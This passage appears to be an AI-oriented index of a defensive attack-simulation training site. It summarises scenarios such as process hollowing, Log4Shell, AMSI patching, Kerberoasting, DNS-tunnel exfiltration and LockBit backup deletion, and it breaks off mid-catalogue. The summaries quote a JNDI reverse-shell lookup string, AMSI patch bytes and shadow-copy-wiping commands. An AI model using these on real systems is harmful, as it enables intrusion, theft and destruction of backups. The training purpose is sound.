# Attack Explorer — Complete Technical Encyclopedia for AI Agents (llms-full.txt)

> Comprehensive index of all 157 MITRE ATT&CK, Ransomware, Supply Chain, Zero-Day, Cloud, and DFIR scenarios in Attack Explorer.

## Global Analytical Frameworks & Primary References
- **The MITRE Corporation (ATT&CK-ENTERPRISE-V15):** [MITRE ATT&CK® Enterprise Matrix (v15)](https://attack.mitre.org/matrices/enterprise/) — Used for adversary tactic categorization, technique IDs (T1055.012, T1562.001, T1486, T1190, T1558.003, T1071.004), and defensive mitigation mapping.
- **Microsoft Learn / Sysinternals (MS-SYSMON-EID-1-25):** [System Monitor (Sysmon) v15 & Windows Security Auditing Events](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) — Used to structure XML EventLog schemas for Sysmon Event IDs 1, 3, 8, 10, 11, 22, 25 and Windows Security Event IDs 4624, 4688, 4769, and PowerShell 4104.
- **SigmaHQ Open Detection Community (SIGMAHQ-RULES-SPEC):** [Sigma Generic Signature Format for SIEM Systems](https://github.com/SigmaHQ/sigma) — Used as the structural specification for defensive SIEM detection rules shown in the Inspector panel.
- **CISA & NIST National Vulnerability Database (NVD) (NIST-SP-800-86 / CISA-AA):** [CISA Cybersecurity Advisories & NIST SP 800-86 DFIR Guide](https://www.cisa.gov/news-events/cybersecurity-advisories) — Used for incident response workflow modeling, CVE-2021-44228 (Log4Shell) forensic artifacts, and ransomware shadow-copy deletion indicators.
- **PikeRed Cybersecurity Research (PIKERED-CLR-PROFILER-T1574.012):** [Abusing the CLR Profiler: A Trusted-Binary Loader Chain for Initial Access](https://www.pikered.com/en/learn/abusing-the-clr-profiler-a-trusted-binary-loader-chain-for-initial-access/) — Documents the .vhdx Mark-of-the-Web (MotW) container bypass, attrib +h +s super-hidden file evasion, and volatile process-environment COR_ENABLE_PROFILING=1 / COR_PROFILER_PATH injection into signed .NET binaries (KeePass.exe).

## Legal & Synthetic Data Guarantee
100% Synthetic & De-identified Telemetry: All IP addresses (RFC 1918 private ranges 10.10.0.0/16, 172.16.0.0/12 and test/documentation blocks), hostnames (WKS-04.corp.local, CORP-DC01.corp.local), memory addresses, process IDs, and log payloads in this workbench are synthetic simulations created strictly for defensive SOC training, threat modeling, and DFIR education.

## Complete Scenario Catalog (157 Scenarios)

### T1055.012: Process Hollowing & Cobalt Strike Beacon Loader
- **ID:** `process-hollowing`
- **Canonical URL:** https://attackexplorer.org/scenarios/process-hollowing
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=process-hollowing
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine an intruder who wants to enter a high-security bank without raising an alarm. Instead of breaking down the front door in a ski mask, they hire an official armored bank truck, freeze it inside the garage before the driver even starts the route, empty out all the legal bank cargo inside, load their own covert crew into the back of that exact armored truck, and release the brake. Every security camera and guard at the gate still sees the bank’s own trusted license plate and uniform. In this scenario (MITRE ATT&CK T1055.012), the attacker wants to run malicious code on Victim Laptop WKS-04 (10.10.4.15) without triggering antivirus or application-allowlisting rules. Instead of launching an unknown .exe file directly, the stage-1 dropper (Invoice_Q4.exe, PID 3104, the initial loader on disk) calls CreateProcessW to spawn a genuine Windows system process, C:\Windows\System32\svchost.exe (PID 4892, chosen because it carries a valid Microsoft digital signature that host firewalls and analysts trust), in a paused state (CREATE_SUSPENDED = 0x00000004, freezing its primary thread TID 4896 before any code runs) and receives back its master control handles (hProcess = 0x01C4 and hThread = 0x01C8). Using those returned handles, the loader reads the child’s PEB (PEB+0x10 ──▶ ImageBaseAddress = 0x00400000) and unmaps the legitimate Microsoft code from RAM (NtUnmapViewOfSection returning STATUS_SUCCESS = 0x00000000), allocates 264 KB of private RWX memory at that vacated 0x00400000 base and writes 270,336 bytes of the unpacked Cobalt Strike Beacon PE image into it (VirtualAllocEx + WriteProcessMemory with GrantedAccess = 0x1FFFFF), overwrites the frozen thread’s RCX entry-point register to 0x004014A0 and wakes the thread (SetThreadContext + ResumeThread decrementing SuspendCount from 1 to 0), and finally establishes an encrypted TLS 1.3 HTTPS C2 session from the hollowed svchost.exe to 185.220.101.42:443 (GET /jquery-3.3.1.min.js receiving HTTP 200 OK tasking with a 60s / 20% jitter sleep schedule).
- **Stages (5):** Stage 1: CREATE SUSPENDED TARGET PROCESS (T1106) -> Stage 2: UNMAP LEGITIMATE MEMORY IMAGE (T1055.012) -> Stage 3: ALLOCATE RWX & WRITE MALICIOUS PE (T1055.012) -> Stage 4: PATCH THREAD CONTEXT & RESUME (T1055.012) -> Stage 5: OUTBOUND C2 BEACON OVER HTTPS (T1071.001)
- **Primary Sources:** [Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw); [Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering); [Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence](https://www.elastic.co/security-labs)

### CVE-2021-44228: Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)
- **ID:** `log4shell-dfir`
- **Canonical URL:** https://attackexplorer.org/scenarios/log4shell-dfir
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=log4shell-dfir
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building. In this scenario (CISA Advisory AA21-356A / CVE-2021-44228), an attacker (91.214.124.88) compromises a Spring Boot Java server (app-prod-01, 10.20.1.15:8080 behind Nginx Reverse Proxy 10.20.1.10:443) simply by sending a specially crafted text string, ${jndi:ldap://91.214.124.88:1389/Basic/Command/Base64/...} (a dynamic lookup token that Log4j2 evaluates as an executable directory query rather than plain text), inside an HTTP header (X-Api-Version / User-Agent). When the Java application (PID 1420, running as service user tomcat) logs that header using vulnerable Apache Log4j2 (v2.14.1), Log4j’s message lookup feature reaches out to the attacker’s rogue Marshalsec LDAP server (91.214.124.88:1389), follows a referral to download a compiled Java class (Exploit.class from http://91.214.124.88:8888/Exploit.class), and spawns a child shell (/bin/sh PID 8912) that dials an interactive reverse shell back to 91.214.124.88:4444.
- **Stages (4):** Stage 1: INJECT JNDI PAYLOAD IN HTTP HEADER (T1190) -> Stage 2: LOG4J JNDI EVALUATION & OUTBOUND LDAP (T1203) -> Stage 3: LDAP REFERRAL & REMOTE CLASS LOADING (T1105) -> Stage 4: JAVA SPAWNS /BIN/BASH REVERSE SHELL (T1059.004)
- **Primary Sources:** [NIST NVD & Apache Software Foundation: CVE-2021-44228 Apache Log4j2 JNDI Lookup Advisory](https://nvd.nist.gov/vuln/detail/CVE-2021-44228); [CISA Emergency Directive: Apache Log4j Vulnerability Guidance & Detection Signatures](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance); [Swiss NCSC / GOVCERT.ch Technical Analysis: Zero-Day Exploit Targeting Popular Java Library Log4j (JNDI Class-Loading Anatomy)](https://www.ncsc.admin.ch/ncsc/en/home/aktuell/im-fokus/log4j.html)

### T1562.001: Fileless AMSI Memory Bypass & Reflective DLL Injection
- **ID:** `amsi-reflective-dll`
- **Canonical URL:** https://attackexplorer.org/scenarios/amsi-reflective-dll
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=amsi-reflective-dll
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a burglar inside a jewelry store where every bag is inspected by an X-ray scanner at the counter (AMSI). Before pulling any tools out of their coat, the burglar reaches into the X-ray machine’s display wire inside their own room and solders a tiny jumper so the screen permanently flashes "BAG IS CLEAN". With the scanner blinded, they assemble their custom lockpick right in their hands without ever setting a tool down on the floor (the hard drive). Normally, when PowerShell runs a script or loads a .NET assembly, Windows Antimalware Scan Interface (AMSI, the built-in bridge that hands script buffers to the endpoint antivirus before execution) inspects the unencrypted code in memory. In this scenario (MITRE T1562.001 & T1620), the attacker on DEV-WKS-09 (10.10.4.55) first blinds AMSI inside their own PowerShell process (powershell.exe, PID 6120 under CORP\admin_reza) by calling VirtualProtect to make amsi.dll!AmsiScanBuffer (at 0x7FF91A042480) writable and overwriting its prologue with a 6-byte x64 patch (B8 57 00 07 80 C3 -> mov eax, 0x80070057; ret so every scan returns E_INVALIDARG / clean). With AMSI silenced inside PID 6120, PowerShell reflectively loads a 512 KB compiled C# agent DLL directly from a byte array in RAM ([System.Reflection.Assembly]::Load at 0x024A80000, avoiding any file write to the C: drive).
- **Stages (3):** Stage 1: LOCATE AMSISCANBUFFER IN MEMORY (T1562.001) -> Stage 2: PATCH 6 BYTES OF AMSISCANBUFFER PROLOGUE (T1562.001) -> Stage 3: REFLECTIVE DLL LOADING FROM MEMORY BUFFER (T1620)
- **Primary Sources:** [Microsoft Learn: Antimalware Scan Interface (AMSI) Developer Architecture](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal); [Microsoft PowerShell Team: PowerShell Operational Log Event ID 4104 (Script Block Logging)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows); [The MITRE Corporation & Defender Threat Intelligence: MITRE ATT&CK T1620 & T1562.001: Reflective Code Loading & AMSI Memory Patching](https://attack.mitre.org/techniques/T1620/)

### T1558.003: Active Directory Kerberoasting & Pass-the-Hash Lateral Movement
- **ID:** `ad-kerberoasting`
- **Canonical URL:** https://attackexplorer.org/scenarios/ad-kerberoasting
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=ad-kerberoasting
- **Category:** ACTIVE_DIRECTORY | **Severity:** HIGH
- **Overview:** Imagine a theme park where any visitor with a basic entry wristband is allowed to walk up to the ticket booth and ask for a sealed VIP voucher to the SQL Rollercoaster. The booth seals that voucher using the rollercoaster manager’s secret password. Instead of riding the coaster, the attacker takes the sealed voucher home to their basement and tries millions of passwords per second until the seal pops open, without a single guard at the park knowing they are guessing. In Windows Active Directory, any standard domain user is allowed to ask the Domain Controller (DC01.corp.local, 10.10.1.5) for a Kerberos Service Ticket (TGS) to connect to any service registered with a Service Principal Name (SPN, the directory tag that links a network service like SQL Server to the service account that runs it). Because the Domain Controller encrypts that ticket using the password hash of the target service account (svc_mssql), an attacker on WS-FINANCE-04 (10.10.20.45, running Rubeus.exe PID 3920 under standard user CORP\m.karimi) can request the ticket for MSSQLSvc/sql01.corp.local:1433 with downgraded RC4 encryption (etype 0x17, Windows Security Event ID 4769), crack the $krb5tgs$23$* hash offline with Hashcat (-m 13100) to recover svc_mssql’s password, authenticate over SMB (LogonType = 3, Event ID 4624) to SQL01.corp.local (10.10.5.20), and spawn PSEXESVC.exe (PID 5190 via services.exe PID 628, Event ID 7045) as NT AUTHORITY\SYSTEM.
- **Stages (3):** Stage 1: REQUEST RC4-DOWNGRADED KERBEROS TGS (EVENT 4769) (T1558.003) -> Stage 2: OFFLINE CRACKING & SMB LOGON (EVENT 4624) (T1550.002) -> Stage 3: REMOTE SERVICE EXECUTION VIA PSEXEC (EVENT 7045) (T1543.003)
- **Primary Sources:** [Microsoft Windows Security Auditing: Event ID 4769: A Kerberos service ticket was requested (RC4 0x17)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769); [Microsoft Windows Security Auditing: Event ID 4624: An account was successfully logged on (LogonType 3)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624); [NSA & CISA Cybersecurity Technical Guidance: Mitigating Kerberoasting and Active Directory Service Account Compromise](https://attack.mitre.org/techniques/T1558/003/)

### T1071.004: DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration
- **ID:** `dns-tunneling-exfil`
- **Canonical URL:** https://attackexplorer.org/scenarios/dns-tunneling-exfil
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=dns-tunneling-exfil
- **Category:** NETWORK_WEB | **Severity:** HIGH
- **Overview:** Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for Secret-Blueprint-Page1-4a6f686e.evil-c2.net?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the evil-c2.net directory desk. Even in tightly locked-down networks where isolated servers cannot browse external websites directly (blocked by Egress Firewall dropping TCP 80/443), internal hosts still resolve domain names through an internal corporate DNS resolver. In this scenario (MITRE T1071.004 & T1048.003), the exfiltration implant sync_agent.exe (PID 4412, PPID 1900 under CORP\svc_backup) on isolated database backup host DB-BACKUP-02 (10.50.1.12) reads C:\Backups\customers_pii.csv, splits it into 48-byte chunks, hex-encodes each chunk into a high-entropy subdomain (<seq>.<hex_data>.c2.badactor-dns.net), and sends UDP/53 DNS TXT queries to the Internal DNS Resolver (10.50.1.53). Experiencing a 100% cache miss rate, 10.50.1.53 recursively forwards every query across the firewall to the attacker’s authoritative Name Server (ns1.badactor-dns.net at 45.133.1.99:53), which reassembles customers_pii.csv and replies with C2 commands inside DNS TXT records (TTL=0).
- **Stages (3):** Stage 1: CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS (T1048.003) -> Stage 2: RECURSIVE RELAY THROUGH CORPORATE DNS SERVER (T1071.004) -> Stage 3: REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND (T1071.004)
- **Primary Sources:** [IETF Network Working Group: RFC 1035: Domain Names — Implementation and Specification](https://datatracker.ietf.org/doc/html/rfc1035); [Microsoft Sysinternals: Sysmon Event ID 22: DNSEvent (DNS Query Logging)](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-22-dnsevent); [Palo Alto Networks Unit 42: DNS Tunneling: How DNS Can Be Abused by Malicious Actors (OilRig / APT34 Tradecraft)](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)

### T1486 / T1490: LockBit Ransomware Behavioral Analysis: VSS Wipe & Fast Encryption
- **ID:** `ransomware-shadow-wipe`
- **Canonical URL:** https://attackexplorer.org/scenarios/ransomware-shadow-wipe
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=ransomware-shadow-wipe
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine an extortionist who plans to put heavy padlocks on every filing cabinet in an office and demand a ransom for the keys. Before clicking a single padlock shut, the first thing they do is walk into the back storage room and shred every photocopy and backup microfilm reel (vssadmin delete shadows /all /quiet), so the office manager cannot simply ignore the padlocks and pull out yesterday’s copies. Before a ransomware payload encrypts a single user document on a Windows server, it performs "Inhibit System Recovery" (MITRE ATT&CK T1490). Windows automatically keeps point-in-time backup snapshots of files using the Volume Shadow Copy Service (VSS). This scenario traces how the LockBit 3.0 ransomware binary (C:\Windows\Temp\lb3_payload.exe, PID 5540, PPID 3100 under CORP\admin_srv) creates mutex Global\39481-LB3, spawns vssadmin.exe delete shadows /all /quiet (PID 5812, destroying all local VSS restore points so administrators cannot recover files for free) and bcdedit.exe /set {default} recoveryenabled No, and then executes multi-threaded intermittent AES-NI + RSA-2048 file encryption across D:\Shares\Finance\* (such as Q4_Budget.xlsx.lockbit) while dropping the 4.1 KB Restore-My-Files.txt ransom note.
- **Stages (2):** Stage 1: INHIBIT SYSTEM RECOVERY VIA VSS DELETION (T1490) -> Stage 2: MULTI-THREADED INTERMITTENT FILE ENCRYPTION (T1486)
- **Primary Sources:** [CISA / FBI / MS-ISAC Joint Advisory: Understanding Ransomware Threat Actors: LockBit 3.0 (AA23-165A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a); [Microsoft Learn & Sysinternals: Volume Shadow Copy Service (VSS) & Sysmon Event ID 1 / 11](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service); [The MITRE Corporation & Ransomware DFIR Research: MITRE ATT&CK T1486 & T1490: Intermittent File Encryption & Recovery Inhibition](https://attack.mitre.org/techniques/T1486/)

### CVE-2024-3400: Unit 42 — Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor
- **ID:** `unit42-panos-midnight-eclipse`
- **Canonical URL:** https://attackexplorer.org/scenarios/unit42-panos-midnight-eclipse
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=unit42-panos-midnight-eclipse
- **Category:** NETWORK_WEB | **Severity:** CRITICAL
- **Overview:** Imagine a hotel front desk where any guest can hand the clerk a luggage tag (SESSID cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder, and once every minute, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (bash -c). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges. Synthesizing independent investigations from Volexity (who discovered the zero-day campaign as UTA0218), Palo Alto Networks Unit 42 (Operation MidnightEclipse), and Rapid7 AttackerKB, CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection flaw in PAN-OS GlobalProtect. The attacker chains two distinct bugs: (1) an arbitrary file-creation flaw in the SESSID HTTP cookie (../../../../opt/panlogs/tmp/device_telemetry/minute/..., using "../" directory traversal to plant a 0-byte file inside the privileged telemetry queue folder) and (2) a shell command-injection flaw when the root-privileged dt_curl / sendTelemetry cron job passes that filename into a backtick-evaluated shell command, allowing the attacker to implant the UPSTYLE Python backdoor in system.pth and steal running-config.xml.
- **Stages (3):** Stage 1: SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400) (T1190) -> Stage 2: TELEMETRY CRON SHELL EXECUTION (DT_CURL) (T1059.004) -> Stage 3: UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2 (T1546.016)
- **Primary Sources:** [Palo Alto Networks Unit 42: Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400](https://unit42.paloaltonetworks.com/cve-2024-3400/); [Volexity Threat Research: Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/); [Palo Alto Networks PSIRT & Rapid7 AttackerKB: CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection in GlobalProtect](https://security.paloaltonetworks.com/CVE-2024-3400)

### T1218.014: Elastic Security Labs — GrimResource: MMC & apds.dll XSS-to-RCE Execution
- **ID:** `elastic-grimresource-msc`
- **Canonical URL:** https://attackexplorer.org/scenarios/elastic-grimresource-msc
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=elastic-grimresource-msc
- **Category:** MALWARE | **Severity:** HIGH
- **Overview:** Imagine a company that banned employees from opening .exe packages, but still trusts official-looking "Settings Binder" files (.msc) opened by the built-in Windows Management Console (mmc.exe). The attacker hides a legacy 1990s self-running gadget (apds.dll XSS) inside a Settings Binder; when opened, mmc.exe automatically runs the hidden script inside its own trusted process. Synthesizing research from Elastic Security Labs (who discovered "GrimResource" in June 2024), MDSec (DotNetToJScript), and Microsoft MSRC (CVE-2024-43572), this technique achieves arbitrary code execution inside Windows Management Console (mmc.exe, the signed Microsoft binary used for Event Viewer and Device Manager) when a user opens a crafted Microsoft Saved Console (.msc) file. By abusing a cross-site scripting (XSS) flaw in the legacy Windows apds.dll library (res://apds.dll/redirect.html, which blindly executes javascript: URLs inside mmc.exe’s HTML view) together with DotNetToJScript (deserializing a .NET assembly directly in RAM via BinaryFormatter) and RwSection injection into dllhost.exe, the attacker runs Cobalt Strike inside a trusted system process.
- **Stages (3):** Stage 1: MMC PARSES CRAFTED .MSC & LOADS APDS.DLL (T1218.014) -> Stage 2: XSLT TRANSFORMNODE & DOTNETTOJSCRIPT CLR LOAD (T1059.005) -> Stage 3: SACRIFICIAL DLLHOST.EXE SPAWN & INDIRECT SYSCALL INJECTION (T1055.002)
- **Primary Sources:** [Elastic Security Labs: GrimResource — Microsoft Management Console for Initial Access and Evasion](https://www.elastic.co/security-labs/grimresource); [Microsoft Security Response Center (MSRC): CVE-2024-43572: Microsoft Management Console (MMC) Remote Code Execution Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43572); [The MITRE Corporation: MITRE ATT&CK T1218.014: System Binary Proxy Execution — MMC](https://attack.mitre.org/techniques/T1218/014/)

### T1574.002: Elastic Security Labs — Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor
- **ID:** `elastic-lotus-blossom-chrysalis`
- **Canonical URL:** https://attackexplorer.org/scenarios/elastic-lotus-blossom-chrysalis
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=elastic-lotus-blossom-chrysalis
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a celebrity who only travels with their trusted personal assistant (mpclient.dll / libcurl.dll). Windows has a habit of checking the hotel lobby (the current folder) for the assistant before checking the official headquarters (System32). The attacker places an imposter wearing a name tag that says mpclient.dll right in the lobby next to a genuine, digitally signed program (MsMpEng.exe or Notepad++ GUP.exe). When the genuine program starts up, it hires the imposter standing right next to it. Synthesizing independent reports from Elastic Security Labs (who dissected the Notepad++ WinGUp GUP.exe + libcurl.dll + CHRYSALIS chain) and Cisco Talos (who documented the MsMpEng.exe + mpclient.dll + Sagerunex lineage), the Lotus Blossom APT group (Billbug / Spring Dragon / G0030) relies on a 3-piece DLL Side-Loading triad (MITRE T1574.002). Instead of running an unsigned malware .exe that EDR agents would block, the attacker drops a genuine, digitally signed executable (GUP.exe or MsMpEng.exe, chosen because its valid digital signature passes application-allowlisting checks) alongside a maliciously crafted companion DLL (libcurl.dll or mpclient.dll, loaded automatically from the current directory) and an RC4/XOR-encrypted payload file (chrysalis.dat / conf.bin, keeping the real backdoor scrambled on disk).
- **Stages (3):** Stage 1: WINGUP (GUP.EXE) DLL SIDE-LOADING OF LIBCURL.DLL (T1574.002) -> Stage 2: FNV-1A / MURMURHASH API RESOLUTION & CHRYSALIS DECRYPTION (T1027.007) -> Stage 3: CHRYSALIS HTTPS C2 BEACON & INTERACTIVE RECON (T1071.001)
- **Primary Sources:** [Elastic Security Labs: Lotus Blossom Espionage Intrusion Analysis: Sagerunex & CHRYSALIS Loader Chains](https://www.elastic.co/security-labs); [Cisco Talos Intelligence Group: Lotus Blossom (Spring Dragon / Billbug) Sagerunex Backdoor & DLL Side-Loading Tradecraft](https://blog.talosintelligence.com/); [The MITRE Corporation: MITRE ATT&CK Group G0030: Lotus Blossom (Spring Dragon / Billbug)](https://attack.mitre.org/groups/G0030/)

### T1078.004: Unit 42 & CISA — Scattered Spider (Muddled Libra): SSO MFA Fatigue, RMM & AWS/ESXi Pivot
- **ID:** `unit42-scattered-spider-cloud`
- **Canonical URL:** https://attackexplorer.org/scenarios/unit42-scattered-spider-cloud
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=unit42-scattered-spider-cloud
- **Category:** ACTIVE_DIRECTORY | **Severity:** CRITICAL
- **Overview:** Instead of picking the reinforced digital lock on the front door, the intruder calls the building’s IT Helpdesk pretending to be an employee who just bought a new phone, convinces the clerk to register the intruder’s own smartphone as the employee’s MFA badge, walks right into the IT Lobby (SSO Dashboard), and plugs a private tunnel cable (ngrok / Tailscale) directly into the cloud and virtual server control room. Synthesizing joint reports from CISA/FBI Advisory AA23-320A, Palo Alto Networks Unit 42 ("Muddled Libra"), and Google Mandiant ("UNC3944"), this scenario shows how modern identity-focused attackers bypass perimeter firewalls altogether. Instead of exploiting a software bug, the attacker calls the company’s IT Helpdesk pretending to be a real employee (vishing), convinces the helpdesk agent to reset Multi-Factor Authentication (MFA) and enroll the attacker’s own phone (giving the attacker a clean, first-party MFA device on the victim’s account), logs into the corporate Single Sign-On (Okta / Entra ID) portal, searches internal SharePoint/Confluence wikis for admin runbooks, deploys a legitimate remote-access tool (AnyDesk / Tailscale, signed commercial RMM tools that do not trigger malware alerts) for persistence, and pivots into AWS/Azure cloud infrastructure and VMware ESXi hypervisors.
- **Stages (3):** Stage 1: OKTA MFA PUSH FATIGUE & ROGUE DEVICE ENROLLMENT (T1621) -> Stage 2: AUTHORIZED RMM TOOL DEPLOYMENT (SCREENCONNECT / NGROK) (T1219) -> Stage 3: SAML FEDERATION PIVOT TO AWS & VMWARE VCENTER (T1078.004)
- **Primary Sources:** [Palo Alto Networks Unit 42: Muddled Libra (Scattered Spider) Cloud Identity & VMware ESXi Intrusion Playbook](https://unit42.paloaltonetworks.com/muddled-libra/); [CISA & FBI Joint Advisory: Scattered Spider (AA23-320A) Cybersecurity Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a); [Mandiant / Google Cloud Threat Intelligence: UNC3944: SMS Phishing, SIM Swapping, and Cloud Identity Provider Intrusions](https://cloud.google.com/blog/topics/threat-intelligence/)

### T1620: Elastic & Mandiant — APT41 (Brass Typhoon): DodgeBox, Call-Stack Spoofing & DUSTPAN Loader
- **ID:** `elastic-apt41-dustpan-stealthvector`
- **Canonical URL:** https://attackexplorer.org/scenarios/elastic-apt41-dustpan-stealthvector
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=elastic-apt41-dustpan-stealthvector
- **Category:** MALWARE | **Severity:** CRITICAL
- **Overview:** Imagine a Russian nesting doll of disguises: first, a trusted Windows system utility (wermgr.exe) is woken up; inside it sits a hollow launcher (DUSTPAN), which unpacks an encrypted memory-only command center (STEALTHVECTOR), which in turn unlocks a modular toolkit (DUSTTRAP) that talks directly to the Windows kernel (ntdll.dll) so user-mode security cameras never see it. Synthesizing independent research from Google Mandiant (DUSTPAN & DUSTTRAP), Elastic Security Labs (DodgeBox & STEALTHVECTOR), and Trend Micro (Earth Freybug), this scenario examines the multi-stage memory-only loader chain used by APT41. Rather than putting their full backdoor in a single file that analysts could easily reverse-engineer, APT41 uses a chain of hollow loaders: a legitimate Windows process (wermgr.exe, Windows Error Reporting, documented by Trend Micro as chosen because it regularly makes outbound HTTPS connections) is spawned and injected with Mandiant’s DUSTPAN launcher, which decrypts Elastic’s STEALTHVECTOR orchestrator in memory (which overwrites ntdll.dll in RAM to wipe out user-mode EDR hooks and spoofs thread call stacks), which in turn loads the 16-plugin DUSTTRAP framework.
- **Stages (3):** Stage 1: DODGEBOX / DUSTPAN DLL SIDE-LOADING & ENV KEYING (T1574.002) -> Stage 2: CALL-STACK SPOOFING & REFLECTIVE DUSTTRAP MAPPING (T1620) -> Stage 3: CLOUDFLARE WORKER C2 & PLUGIN EXECUTION (T1071.001)
- **Primary Sources:** [Elastic Security Labs: APT41 (Brass Typhoon) DodgeBox, Call-Stack Spoofing, and STEALTHVECTOR Analysis](https://www.elastic.co/security-labs); [Mandiant / Google Cloud Threat Intelligence: APT41 DUSTPAN Loader and DUSTTRAP Multi-Stage In-Memory Plugin Ecosystem](https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments); [The MITRE Corporation & Trend Micro Research: MITRE ATT&CK Group G0096: APT41 (Wicked Panda / Brass Typhoon / Earth Freybug)](https://attack.mitre.org/groups/G0096/)

### T1003.003: Microsoft & CISA — Volt Typhoon: Living-off-the-Land ntdsutil IFM & netsh Portproxy
- **ID:** `ms-volt-typhoon-lotl`
- **Canonical URL:** https://attackexplorer.org/scenarios/ms-volt-typhoon-lotl
- **Simulator Deep Link:** https://attackexplorer.org/?scenario=ms-volt-typhoon-lotl
- **Category:** ACTIVE_DIRECTORY | **Severity:** CRITICAL
- **Overview:** Imagine an infiltrator who enters a high-security facility carrying zero weapons or burglar tools in their pockets. Instead, they pick up the facility’s own maintenance clipboard (wmic.exe), use the building’s built-in port-forwarding intercom (netsh interface portproxy) to relay messages through retired home routers (KV-Botnet), and ask the facility’s official backup machine (ntdsutil.exe) to print a full copy of the master key vault (ntds.dit). Because every single action is performed by an official, factory-installed Windows utility, file-based antivirus scanners see zero foreign malware. Documented by Joint CISA/NSA/FBI/Microsoft Advisory AA24-038A, the Volt Typhoon APT group specializes in "Living off the Land" (LotL, executing attacks exclusively with built-in operating system tools so zero custom malware files ever touch the disk). Instead of using hacktools like Mimikatz that trigger antivirus immediately, Volt Typhoon routes traffic through a botnet of compromised SOHO routers (KV-Botnet at 198.51.100.14, making traffic originate from local residential or small-business IPs), runs built-in Windows administration commands (wmic, ntdsutil, netsh, all validly signed by Microsoft) from jump server SRV-MGMT-01 (10.10.15.22), extracts the entire Active Directory password database (ntds.dit) on CORP-DC01 (10.10.0.5) using ntdsutil.exe (PID 6412), and creates a stealthy port-forwarding relay via netsh.exe (PID 6890).
- **Stages (3):** Stage 1: HANDS-ON-KEYBOARD WMI DISCOVERY & LATERAL EXEC (T1047) -> Stage 2: OFFLINE NTDS.DIT EXTRACTION VIA NTDSUTIL IFM (T1003.003) -> Stage 3: MULTI-HOP INTERNAL RELAY VIA NETSH PORTPROXY (T1090.001)
- **Primary Sources:** [Microsoft Threat Intelligence: Volt Typhoon targets US critical infrastructure with living-off-the-land techniques](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/); [CISA / NSA / FBI Joint Advisory: PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure (AA24-038A)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a); [The MITRE Corporation & Black Lotus Labs Research: MITRE ATT&CK Group G1017: Volt Typhoon (Bronze Silhouette) & KV Botnet Relay Infrastructure](https://attack.mitre.org/groups/G1017/)

### T1098.003: Microsoft Threat Intel — Midnight Blizzard (APT29): OAuth App Persistence & EWS Exfiltration
- **ID:** `ms-midnight-blizzard-oauth`
